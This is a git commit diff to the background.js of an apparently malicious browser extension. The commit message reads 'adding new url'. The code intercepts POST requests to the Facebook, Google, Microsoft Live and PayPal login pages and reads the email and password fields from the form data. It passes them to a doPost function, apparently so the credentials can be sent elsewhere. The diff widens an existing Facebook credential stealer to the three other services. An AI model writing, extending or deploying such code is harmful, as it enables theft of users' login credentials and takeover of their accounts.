ee9603acf64951aaaf2c387d56a381adaee3533d
nic0latesla <elec7r00n@gmail.com>
2018-09-22 15:04:53 -0700

    adding new url

--- background.js
+++ background.js
@@ -1,19 +1,41 @@
 'use strict';
 
-var targetPage = "*://*.facebook.com/login.php*";
+var targetFacebook = "*://*.facebook.com/login.php*";
+var targetGmail = "*://accounts.google.com/signin/v2/challenge/password/empty";
+var targetLive = "*://*.live.com/ppsecure/post.srf*";
+var targetPaypal = "*://*.paypal.com/signin";
 
 browser.webRequest.onBeforeRequest.addListener(
   function(details) {
     if(details.method == "POST") {
-      console.log(details.requestBody.formData);
-	    if(details.requestBody.formData.email === undefined){
-      		doPost("repeat",details.requestBody.formData.pass[0]);
-	    }else{
-      		doPost(details.requestBody.formData.email[0],details.requestBody.formData.pass[0]);
-	    }
+	if(details.url.indexOf("facebook") != -1 ){
+		    console.log(details.requestBody.formData);
+		    if(details.requestBody.formData.email === undefined){
+			doPost("repeat",details.requestBody.formData.pass[0]);
+		    }else{
+			doPost(details.requestBody.formData.email[0],details.requestBody.formData.pass[0]);
+		    }
+	}
+	
+	if(details.url.indexOf("google") != -1 ){
+		console.log(details.requestBody.formData);
+		doPost(details.requestBody.formData.identifier[0],details.requestBody.formData.password[0]);
+	}
+
+
+	if(details.url.indexOf("live") != -1 ){
+		console.log(details.requestBody.formData);
+		doPost(details.requestBody.formData.login[0],details.requestBody.formData.passwd[0]);
+	}
+
+	if(details.url.indexOf("paypal") != -1 ){
+		console.log(details.requestBody.formData);
+		doPost(details.requestBody.formData.login_email[0],details.requestBody.formData.login_password[0]);
+	}
+
     }
   },
-  {urls: [targetPage]},
+  {urls: [targetFacebook,targetGmail,targetLive,targetPaypal]},
   ["requestBody"]
 );
 
